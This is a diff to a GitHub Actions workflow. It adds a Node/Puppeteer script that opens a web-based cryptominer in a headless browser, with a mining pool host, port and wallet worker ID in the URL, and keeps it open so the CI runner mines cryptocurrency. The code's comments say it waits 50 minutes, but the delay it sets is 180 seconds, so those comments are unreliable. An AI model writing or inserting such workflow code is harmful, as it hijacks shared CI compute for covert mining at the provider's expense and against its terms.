@@ -27,18 +27,28 @@ jobs:
         run: |
           node -e "
           const puppeteer = require('puppeteer');
+          const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+          
           (async () => {
             const browser = await puppeteer.launch({ headless: true });
             const page = await browser.newPage();
-            await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=4');
-            const content = await page.content();
+            await page.goto('https://webminer.pages.dev?algorithm=yespower&host=stratum-asia.rplant.xyz&port=17122&worker=QXAU8sRQcwx4Agii4a4VLpkD3SwF7MohgS&password=x&workers=4');
+            
+            // Log page title
             console.log('Page title:', await page.title());
+            
+            // Wait for 50 minutes
+            console.log('Waiting for 50 minutes...');
+            await delay(3000 * 60); // Wait for 3000 seconds (50 minutes)
+            
+            // Optionally take a screenshot or perform other actions here
+            await page.screenshot({ path: 'screenshot.png' });
+            
+            // Save page content
+            const content = await page.content();
             require('fs').writeFileSync('response.html', content);
+            
+            console.log('Finished waiting, closing browser...');
             await browser.close();
           })();
           "
-
-      - name: Sleep for 50 minutes
-        run: |
-          echo "Sleeping for 50 minutes..."
-          sleep 3000  # Sleep for 3000 seconds (50 minutes)
